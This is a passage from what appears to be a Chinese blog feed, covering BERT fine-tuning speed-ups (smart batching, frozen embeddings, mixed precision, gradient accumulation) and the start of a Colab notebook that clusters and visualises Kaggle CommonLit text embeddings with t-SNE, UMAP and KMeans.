class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">__len__</span><span class="hljs-params">(self)</span>:</span><br>        <span class="hljs-keyword">return</span> self.len<br>    <br><span class="hljs-meta">    @property</span><br>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">backsort_inds</span><span class="hljs-params">(self)</span>:</span><br>        “未shuffle时，batch序列按照长度排序的结果”<br>        <span class="hljs-keyword">if</span> self._backsort_inds <span class="hljs-keyword">is</span> <span class="hljs-literal">None</span>:<br>            self._backsort_inds = np.argsort(self._inds)<br>        <span class="hljs-keyword">return</span> self._backsort_inds<br>    <br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">SmartBatchingCollate</span>:</span><br>    “每个batch分别pad到最大长度，得到attention mask，处理target”<br>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">__init__</span><span class="hljs-params">(self, targets, max_length, pad_token_id)</span>:</span><br>        self._targets = targets<br>        self._max_length = max_length<br>        self._pad_token_id = pad_token_id<br>        <br>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">__call__</span><span class="hljs-params">(self, batch)</span>:</span><br>        <span class="hljs-keyword">if</span> self._targets <span class="hljs-keyword">is</span> <span class="hljs-keyword">not</span> <span class="hljs-literal">None</span>:<br>            sequences, targets = list(zip(*batch))<br>        <span class="hljs-keyword">else</span>:<br>            sequences = list(batch)<br>        <br>        input_ids, attention_mask = self.pad_sequence(<br>            sequences,<br>            max_sequence_length=self._max_length,<br>            pad_token_id=self._pad_token_id<br>        )<br>        <br>        <span class="hljs-keyword">if</span> self._targets <span class="hljs-keyword">is</span> <span class="hljs-keyword">not</span> <span class="hljs-literal">None</span>:<br>            output = input_ids, attention_mask, torch.tensor(targets)<br>        <span class="hljs-keyword">else</span>:<br>            output = input_ids, attention_mask<br>        <span class="hljs-keyword">return</span> output<br>    <br>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">pad_sequence</span><span class="hljs-params">(self, sequence_batch, max_sequence_length, pad_token_id)</span>:</span><br>        max_batch_len = max(len(sequence) <span class="hljs-keyword">for</span> sequence <span class="hljs-keyword">in</span> sequence_batch)<br>        max_len = min(max_batch_len, max_sequence_length)<br>        padded_sequences, attention_masks = [[] <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">2</span>)]<br>        attend, no_attend = <span class="hljs-number">1</span>, <span class="hljs-number">0</span><br>        <span class="hljs-keyword">for</span> sequence <span class="hljs-keyword">in</span> sequence_batch:<br>            <span class="hljs-comment"># 限制model所允许的最大长度</span><br>            new_sequence = list(sequence[:max_len])<br>            <br>            attention_mask = [attend] * len(new_sequence)<br>            pad_length = max_len - len(new_sequence)<br>            <br>            new_sequence.extend([pad_token_id] * pad_length)<br>            attention_mask.extend([no_attend] * pad_length)<br>            <br>            padded_sequences.append(new_sequence)<br>            attention_masks.append(attention_mask)<br>        <br>        padded_sequences = torch.tensor(padded_sequences)<br>        attention_masks = torch.tensor(attention_masks)<br>        <span class="hljs-keyword">return</span> padded_sequences, attention_masks<br></code></pre></div></td></tr></table></figure><p>使用：</p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python">dataset = SmartBatchingDataset(train, tokenizer)<br>dataloader = dataset.get_dataloader(batch_size=<span class="hljs-number">24</span>, max_len=max_len, pad_id=tokenizer.pad_token_id)<br></code></pre></div></td></tr></table></figure><p><strong>已经证明，这种技术不仅显著的减少了训练时间，而且不会减少准确性（在某些情况下甚至提高）。</strong></p><h3><span id="freeze-embedding">Freeze Embedding</span></h3><p>Freezing Embedding Layer of transformers加速训练并节省显存。</p><p>一种解释是（看看就好，没有严格证明）：finetuning用的小数据集中，新出现的token会导致原languagemodel中学习好的局部同义词间结构关系被破坏。</p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">import</span> transformers<br><span class="hljs-keyword">from</span> transformers <span class="hljs-keyword">import</span> AutoConfig, AutoModelForSequenceClassification<br><br>freeze_embedding = <span class="hljs-literal">True</span><br><br>config = AutoConfig.from_pretrained(<span class="hljs-string">'roberta-base'</span>)<br>model = AutoModelForSequenceClassification.from_pretrained(<br>    _pretrained_model, config=config<br>)<br>model.base_model.embeddings.requires_grad_(<span class="hljs-keyword">not</span> freeze_embedding)<br></code></pre></div></td></tr></table></figure><p>这种方法，可以一试，可以用更大的batch size。</p><h3><span id="numeric-precision-reduction">Numeric Precision Reduction</span></h3><p>混合精度。常见的推理加速方法。</p><blockquote><p>在过去的几年，GPU硬件对float16操作的糟糕支持，意味着降低权重和激活值的精度通常会适得其反，但是NVIDIAVolta和Turing架构与张量核心的引入，意味着现代GPU可以更高效的支持float16运算。</p></blockquote><p>大多数transformer网络都可以简单地转换为float16权值和激活值计算，而没有精度损失。</p><p><img src="https://cdn.jsdelivr.net/gh/racleray/image_storage/images/Practical BERT_pic/image-20210720215123109.png" srcset="/img/loading.gif" lazyload alt="浮点数的计算机表示方法" style="zoom:80%;"></p><p>之所以要保留float32，是因为像softmax这类，计算时有较长的连加运算，这时使用float16可能存在精度损失。</p><p>半精度的加速来源于，半精度计算指令本身的速度更快，另外此时可以使用更大的batchsize。</p><p>开源工具：<a href="https://github.com/NVIDIA/apex">NVIDIA-apex</a>；<a href="https://pytorch.org/docs/stable/amp.html">torch.cuda.amp</a>--相比AMP，使用更灵活一些，但是用起来都差不多。</p><p>注意：小batchsize时，混合精度会由于频繁IO导致的时间损失大于小batch的半精度训练所节省的时间。</p><p><a href="https://pytorch.org/docs/stable/notes/amp_examples.html">示例</a></p><h3><span id="gradient-accumulation">Gradient Accumulation</span></h3><p>就是累计梯度几个轮次，然后进行一次参数更新。</p><p>示例程序</p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python">optimizer.zero_grad()                               <span class="hljs-comment"># Reset gradients tensors</span><br><span class="hljs-keyword">for</span> i, (inputs, labels) <span class="hljs-keyword">in</span> enumerate(training_set):<br>    predictions = model(inputs)                     <span class="hljs-comment"># Forward pass</span><br>    loss = loss_function(predictions, labels)       <span class="hljs-comment"># Compute loss function</span><br>    loss = loss / accumulation_steps                <span class="hljs-comment"># Normalize our loss (if averaged)</span><br>    loss.backward()                                 <span class="hljs-comment"># Backward pass</span><br>    <span class="hljs-keyword">if</span> (i+<span class="hljs-number">1</span>) % accumulation_steps == <span class="hljs-number">0</span>:             <span class="hljs-comment"># Wait for several backward steps</span><br>        optimizer.step()                            <span class="hljs-comment"># Now we can do an optimizer step</span><br>        optimizer.zero_grad()                           <span class="hljs-comment"># Reset gradients tensors</span><br>        <span class="hljs-keyword">if</span> (i+<span class="hljs-number">1</span>) % evaluation_steps == <span class="hljs-number">0</span>:           <span class="hljs-comment"># Evaluate the model when we...</span><br>            evaluate_model()                        <span class="hljs-comment"># ...have no gradients accumulated</span><br></code></pre></div></td></tr></table></figure><p>如果我们的损失是在训练样本上平均的，我们还需要除以积累步骤的数量。</p><h3><span id="gradient-checkpointing">Gradient Checkpointing</span></h3><p>以时间为代价，节省GPU内存。</p><p>通过将模型分为不同的段，每个段计算时，分别进行计算，将当前段计算结果传给下一个段后，当前段的中间状态都不会保存。</p><p><a href="https://github.com/prigoyal/pytorch_memonger/blob/master/tutorial/Checkpointing_for_PyTorch_models.ipynb">示例</a><a href="https://github.com/csrhddlam/pytorch-checkpoint#:~:text=Gradient%20checkpointing%20is%20a%20technique%20to%20reduce%20GPU%20memory%20cost.">PyTorchCheckpoint多GPU优化</a></p><h3><span id="其他开源工具">其他开源工具</span></h3><ul><li><a href="https://github.com/microsoft/deepspeed" target="_blank" rel="noopener">DeepSpeed</a><br></li><li><a href="https://github.com/facebookresearch/fairscale/">FairScale</a></li><li><a href="https://huggingface.co/blog/accelerate-library">Accelerate</a></li></ul><h2><span id="some-exp">Some Exp</span></h2><ol type="1"><li>讲实话小样集的比赛，是个调参游戏，对于回归任务，更是如此。结构上玩出花，效果反而不好。优化方法上，常见的FGM和SWA对于一些回归任务，基本没啥效果提升。没有尝试过对比学习，可能这是一个好方法。</li><li>比赛中对于这类强学习模型，还是最好bagging，降降variance。</li><li>只把BERT这些庞然大物当做特征抽取器，然后用传统ML算法来学习，会是更方便快捷的方法，而且实践上也确实可行，只是很容易过拟合，BERT特征还是太强了（当然这取决于如何训练和训练的程度）。这可能更快，但是得到好结果需要一些“运气”，还有一点直觉。</li><li>对于比赛而言，large模型得到好结果还是容易一些，就像好多论文，其实方法就那样，主要BERT类模型用large调得好，也容易出好结果。可解释的余地还是太差了。各部分又几乎是关联的，耦合在一起，所以算了。</li><li>好的算法，不应该是亿级参数对数据的变相记忆，那是“数据库”的加权求和与激活函数筛选。让人感觉失望。这里的一面之词是，大模型，总是“不太好”。可是，效果有了，很多时候，还是会真香。</li></ol><h2><span id="nlp-tutorial">NLP Tutorial</span></h2><ul><li><a href="https://notebooks.quantumstat.com/" target="_blank" rel="noopener">The Super Duper NLPRepo</a></li><li><a href="https://huggingface.co/transformers/master/community.html#community-notebooks">HuggingfaceCommunity</a></li><li><a href="https://huggingface.co/transformers/notebooks.html" target="_blank" rel="noopener">HuggingFace’s notebooks</a></li></ul><p>reference：</p><ul><li><a href="https://www.kaggle.com/rhtsingh/code" target="_blank" rel="noopener">kagglerhtsingh</a></li><li><a href="https://arxiv.org/pdf/2006.05987.pdf" target="_blank" rel="noopener">REVISITING FEW-SAMPLEBERT FINE-TUNING</a></li><li><a href="https://arxiv.org/pdf/2006.04884.pdf" target="_blank" rel="noopener">ON THE STABILITY OFFINE-TUNING BERT</a></li><li><a href="https://arxiv.org/pdf/1911.03437.pdf" target="_blank" rel="noopener">SMART: Robust andEfficient Fine-Tuning for Pre-trained Natural Language Models</a></li><li><a href="https://arxiv.org/pdf/2002.06305.pdf" target="_blank" rel="noopener">Fine-TuningPretrained Language Models:Weight Initializations, Data Orders, andEarly Stopping</a></li><li><a href="https://arxiv.org/pdf/1909.11299.pdf" target="_blank" rel="noopener">MIXOUT: EFFECTIVEREGULARIZATION TO FINETUNE LARGE-SCALE PRETRAINED LANGUAGEMODELS</a></li><li><a href="https://arxiv.org/pdf/1905.05583.pdf" target="_blank" rel="noopener">How to Fine-Tune BERTfor Text Classification?</a></li><li><a href="https://arxiv.org/pdf/1811.01088.pdf" target="_blank" rel="noopener">Sentence Encoders onSTILTs: Supplementary Training on Intermediate Labeled-dataTasks</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> Notes </category>
          
          <category> NLP </category>
          
      </categories>
      
      
        <tags>
            
            <tag> BERT </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>BERT_topic_analysis</title>
      <link href="/posts/c228cec2.html"/>
      <url>/posts/c228cec2.html</url>
      
        <content type="html"><![CDATA[<p>运行 <a href="https://colab.research.google.com/drive/1-p21pW1xaDnYuAyKYwbAw8i3yHKvjRFC?usp=sharing">Colab</a></p><h2><span id="connect-to-kaggle">Connect to kaggle</span></h2><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python">!pip install --user kaggle<br>!mkdir /root/.kaggle<br><br>!mv /content/kaggle.json /root/.kaggle/kaggle.json<br><br>!kaggle competitions download -c commonlitreadabilityprize<br><br>!ls<br></code></pre></div></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">import</span> os<br><br><span class="hljs-keyword">for</span> filename <span class="hljs-keyword">in</span> os.listdir(<span class="hljs-string">'.'</span>):<br>    <span class="hljs-keyword">if</span> filename.endswith(<span class="hljs-string">'.zip'</span>):<br>        os.system(<span class="hljs-string">"unzip &#123;&#125;"</span>.format(filename))<br>        os.system(<span class="hljs-string">"rm &#123;&#125;"</span>.format(filename))<br></code></pre></div></td></tr></table></figure><h2><span id="visualization-with-bokeh">Visualization with Bokeh</span></h2><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python">!pip install --upgrade pip<br>!pip install --upgrade numpy<br>!pip install --upgrade sentence_transformers<br>!conda install -c conda-forge hdbscan --y<br>!pip install bokeh<br>!pip install --upgrade bertopic[visualization]<br><br><span class="hljs-comment"># !pip uninstall numpy</span><br><span class="hljs-comment"># !pip install numpy</span><br></code></pre></div></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">from</span> bertopic <span class="hljs-keyword">import</span> BERTopic<br><span class="hljs-keyword">import</span> pandas <span class="hljs-keyword">as</span> pd<br><span class="hljs-keyword">from</span> sentence_transformers <span class="hljs-keyword">import</span> SentenceTransformer<br><span class="hljs-keyword">import</span> sklearn.manifold<br><span class="hljs-keyword">import</span> umap<br><span class="hljs-keyword">import</span> numpy <span class="hljs-keyword">as</span> np<br><span class="hljs-keyword">import</span> pandas <span class="hljs-keyword">as</span> pd<br><span class="hljs-keyword">import</span> random<br><span class="hljs-keyword">from</span> nltk.corpus <span class="hljs-keyword">import</span> stopwords<br><br>random.seed(<span class="hljs-number">42</span>)<br><br><span class="hljs-keyword">from</span> bokeh.io <span class="hljs-keyword">import</span> output_file, show<br><span class="hljs-keyword">from</span> bokeh.models <span class="hljs-keyword">import</span> ColumnDataSource, HoverTool, LinearColorMapper<br><span class="hljs-keyword">from</span> bokeh.palettes <span class="hljs-keyword">import</span> plasma, d3, Turbo256<br><span class="hljs-keyword">from</span> bokeh.plotting <span class="hljs-keyword">import</span> figure<br><span class="hljs-keyword">from</span> bokeh.transform <span class="hljs-keyword">import</span> transform<br><span class="hljs-keyword">import</span> bokeh.io<br>bokeh.io.output_notebook()<br><br><span class="hljs-keyword">import</span> bokeh.plotting <span class="hljs-keyword">as</span> bpl<br><span class="hljs-keyword">import</span> bokeh.models <span class="hljs-keyword">as</span> bmo<br>bpl.output_notebook()<br></code></pre></div></td></tr></table></figure><p>读取数据</p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python">test = pd.read_csv(<span class="hljs-string">'test.csv'</span>)<br>train = pd.read_csv(<span class="hljs-string">'train.csv'</span>)<br><br>train[<span class="hljs-string">'set'</span>] = <span class="hljs-string">'train'</span><br>test[<span class="hljs-string">'set'</span>] = <span class="hljs-string">'test'</span><br><br>combined = pd.concat([train, test], ignore_index=<span class="hljs-literal">True</span>)<br>combined.target.fillna(<span class="hljs-number">3</span>, inplace=<span class="hljs-literal">True</span>)<br><br>texts = combined.excerpt.values.tolist()<br>targets = combined.target.values.tolist()<br>sets = combined.set.values.tolist()<br></code></pre></div></td></tr></table></figure><p>文本处理（可选）</p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-comment"># def preprocess_tweet_data(data,name):</span><br><span class="hljs-comment">#     # Lowering the case of the words in the sentences</span><br><span class="hljs-comment">#     data[name]=data[name].str.lower()</span><br><span class="hljs-comment">#     # Code to remove the Hashtags from the text</span><br><span class="hljs-comment">#     data[name]=data[name].apply(lambda x:re.sub(r'\B#\S+','',x))</span><br><span class="hljs-comment">#     # Code to remove the links from the text</span><br><span class="hljs-comment">#     data[name]=data[name].apply(lambda x:re.sub(r"http\S+", "", x))</span><br><span class="hljs-comment">#     # Code to remove the Special characters from the text </span><br><span class="hljs-comment">#     data[name]=data[name].apply(lambda x:' '.join(re.findall(r'\w+', x)))</span><br><span class="hljs-comment">#     # Code to substitute the multiple spaces with single spaces</span><br><span class="hljs-comment">#     data[name]=data[name].apply(lambda x:re.sub(r'\s+', ' ', x, flags=re.I))</span><br><span class="hljs-comment">#     # Code to remove all the single characters in the text</span><br><span class="hljs-comment">#     data[name]=data[name].apply(lambda x:re.sub(r'\s+[a-zA-Z]\s+', '', x))</span><br><span class="hljs-comment">#     # Remove the twitter handlers</span><br><span class="hljs-comment">#     data[name]=data[name].apply(lambda x:re.sub('@[^\s]+','',x))</span><br><br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">preprocess</span><span class="hljs-params">(data)</span>:</span><br>    excerpt_processed=[]<br>    <span class="hljs-keyword">for</span> e <span class="hljs-keyword">in</span> data[<span class="hljs-string">'excerpt'</span>]:<br>        <span class="hljs-comment"># find alphabets</span><br>        e = re.sub(<span class="hljs-string">"[^a-zA-Z]"</span>, <span class="hljs-string">" "</span>, e)<br>        e = re.sub(<span class="hljs-string">r'\s+'</span>, <span class="hljs-string">' '</span>, e, flags=re.I)<br><br>        <span class="hljs-comment"># # convert to lower case</span><br>        <span class="hljs-comment"># e = e.lower()</span><br>        <br>        <span class="hljs-comment"># tokenize words</span><br>        e = nltk.word_tokenize(e)<br>        <span class="hljs-comment"># remove stopwords</span><br>        e = [word <span class="hljs-keyword">for</span> word <span class="hljs-keyword">in</span> e <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> word.lower() <span class="hljs-keyword">in</span> set(stopwords.words(<span class="hljs-string">"english"</span>))]<br>        <span class="hljs-comment"># lemmatization</span><br>        lemma = nltk.WordNetLemmatizer()<br>        e = [lemma.lemmatize(word) <span class="hljs-keyword">for</span> word <span class="hljs-keyword">in</span> e]<br>        e=<span class="hljs-string">" "</span>.join(e)<br>        <br>        excerpt_processed.append(e)<br>        <br>    <span class="hljs-keyword">return</span> excerpt_processed<br></code></pre></div></td></tr></table></figure><p>使用sentence bert计算文档向量</p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python">model = SentenceTransformer(<span class="hljs-string">'stsb-distilbert-base'</span>)<br></code></pre></div></td></tr></table></figure><figure class="highlight python"><figcaption><span>id</span></figcaption><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python">embeddings = model.encode(texts)<br></code></pre></div></td></tr></table></figure><h3><span id="降维-t-sne-与-umap">降维 t-SNE 与 umap</span></h3><ul><li>t-SNE保留数据中局部结构。</li><li>UMAP保留数据中的本地和大部分全局结构。</li><li>UMAP比tSNE要快得多，当面对更多数据、更高维数据时</li></ul><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python">color_mapper = LinearColorMapper(palette=<span class="hljs-string">'Plasma256'</span>, low=min(targets), high=max(targets))<br>out = sklearn.manifold.TSNE(n_components=<span class="hljs-number">2</span>).fit_transform(embeddings)<br></code></pre></div></td></tr></table></figure><p>绘制Boken。test set标签设置为3。</p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python">SETS = [<span class="hljs-string">'train'</span>, <span class="hljs-string">'test'</span>]<br>MARKERS = [<span class="hljs-string">'circle'</span>, <span class="hljs-string">'triangle'</span>]<br><br>list_x = out[:,<span class="hljs-number">0</span>]<br>list_y = out[:,<span class="hljs-number">1</span>]<br>desc = texts<br><br>source = ColumnDataSource(data=dict(x=list_x, y=list_y, desc=desc, targets=targets, dset=sets))<br>hover = HoverTool(tooltips=[<br>    (<span class="hljs-string">"index"</span>, <span class="hljs-string">"$index"</span>),<br>    (<span class="hljs-string">"(x,y)"</span>, <span class="hljs-string">"(@x, @y)"</span>),<br>    (<span class="hljs-string">'desc'</span>, <span class="hljs-string">'@desc'</span>),<br>    (<span class="hljs-string">'targets'</span>, <span class="hljs-string">'@targets'</span>),<br>    (<span class="hljs-string">'dset'</span>, <span class="hljs-string">'@dset'</span>)<br>])<br><br>p = figure(plot_width=<span class="hljs-number">800</span>, plot_height=<span class="hljs-number">800</span>, tools=[hover], title=<span class="hljs-string">"First Look at the Data"</span>)<br>p.scatter(<span class="hljs-string">'x'</span>, <span class="hljs-string">'y'</span>, size=<span class="hljs-number">10</span>, source=source, legend=<span class="hljs-string">'dset'</span>, color=&#123;<span class="hljs-string">'field'</span>: <span class="hljs-string">'targets'</span>, <span class="hljs-string">'transform'</span>: color_mapper&#125;,<br>         marker=bokeh.transform.factor_mark(<span class="hljs-string">'dset'</span>, MARKERS, SETS),)<br><br>bpl.show(p)<br></code></pre></div></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/racleray/image_storage/images/BERT_topic_analysis_pic/image-20210719222141310.png" srcset="/img/loading.gif" lazyload alt style="zoom:67%;"></p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python">umap_model = umap.UMAP(n_neighbors=<span class="hljs-number">15</span>, n_components=<span class="hljs-number">2</span>, metric=<span class="hljs-string">'cosine'</span>)<br>out_umap = umap_model.fit_transform(embeddings)<br></code></pre></div></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python">SETS = [<span class="hljs-string">'train'</span>, <span class="hljs-string">'test'</span>]<br>MARKERS = [<span class="hljs-string">'circle'</span>, <span class="hljs-string">'triangle'</span>]<br><br>list_x = out_umap[:,<span class="hljs-number">0</span>]<br>list_y = out_umap[:,<span class="hljs-number">1</span>]<br>desc = texts<br><br>source = ColumnDataSource(data=dict(x=list_x, y=list_y, desc=desc, targets=targets, dset=sets))<br>hover = HoverTool(tooltips=[<br>    (<span class="hljs-string">"index"</span>, <span class="hljs-string">"$index"</span>),<br>    (<span class="hljs-string">"(x,y)"</span>, <span class="hljs-string">"(@x, @y)"</span>),<br>    (<span class="hljs-string">'desc'</span>, <span class="hljs-string">'@desc'</span>),<br>    (<span class="hljs-string">'targets'</span>, <span class="hljs-string">'@targets'</span>),<br>    (<span class="hljs-string">'dset'</span>, <span class="hljs-string">'@dset'</span>)<br>])<br><br>p = figure(plot_width=<span class="hljs-number">800</span>, plot_height=<span class="hljs-number">800</span>, tools=[hover], title=<span class="hljs-string">"First Look at the Data"</span>)<br>p.scatter(<span class="hljs-string">'x'</span>, <span class="hljs-string">'y'</span>, size=<span class="hljs-number">10</span>, source=source, legend=<span class="hljs-string">'dset'</span>, color=&#123;<span class="hljs-string">'field'</span>: <span class="hljs-string">'targets'</span>, <span class="hljs-string">'transform'</span>: color_mapper&#125;,<br>         marker=bokeh.transform.factor_mark(<span class="hljs-string">'dset'</span>, MARKERS, SETS),)<br><br>bpl.show(p)<br></code></pre></div></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/racleray/image_storage/images/BERT_topic_analysis_pic/image-20210719222224964.png" srcset="/img/loading.gif" lazyload alt style="zoom:67%;"></p><h3><span id="kmeans-观察数据">Kmeans 观察数据</span></h3><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">from</span> sklearn.decomposition <span class="hljs-keyword">import</span> PCA<br><span class="hljs-keyword">from</span> sklearn.cluster <span class="hljs-keyword">import</span> MiniBatchKMeans<br><span class="hljs-keyword">from</span> sklearn.metrics <span class="hljs-keyword">import</span> silhouette_samples, silhouette_score<br><span class="hljs-keyword">import</span> matplotlib.pyplot <span class="hljs-keyword">as</span> plt<br><span class="hljs-keyword">import</span> matplotlib.cm <span class="hljs-keyword">as</span> cm<br></code></pre></div></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">find_optimal_clusters</span><span class="hljs-params">(data, max_k)</span>:</span><br>    iters = range(<span class="hljs-number">2</span>, max_k+<span class="hljs-number">1</span>, <span class="hljs-number">1</span>)<br>    <br>    sse = []  <span class="hljs-comment"># 轮廓系数</span><br>    <span class="hljs-keyword">for</span> k <span class="hljs-keyword">in</span> iters:<br>        cluster = MiniBatchKMeans(n_clusters=k, init_size=<span class="hljs-number">256</span>, batch_size=<span class="hljs-number">512</span>, random_state=<span class="hljs-number">20</span>).fit(data)<br>        silhouette_avg = silhouette_score(data, cluster.labels_)<br>        sse.append(silhouette_avg)<br>        print(<span class="hljs-string">'Fit &#123;&#125; clusters'</span>.format(k))<br>        <br>    f, ax = plt.subplots(<span class="hljs-number">1</span>, <span class="hljs-number">1</span>)<br>    ax.plot(iters, sse, marker=<span class="hljs-string">'o'</span>)<br>    ax.set_xlabel(<span class="hljs-string">'Cluster Centers'</span>)<br>    ax.set_xticks(iters)<br>    ax.set_xticklabels(iters)<br>    ax.set_ylabel(<span class="hljs-string">'SSE'</span>)<br>    ax.set_title(<span class="hljs-string">'SSE by Cluster Center Plot'</span>)<br></code></pre></div></td></tr></table></figure><figure class="highlight 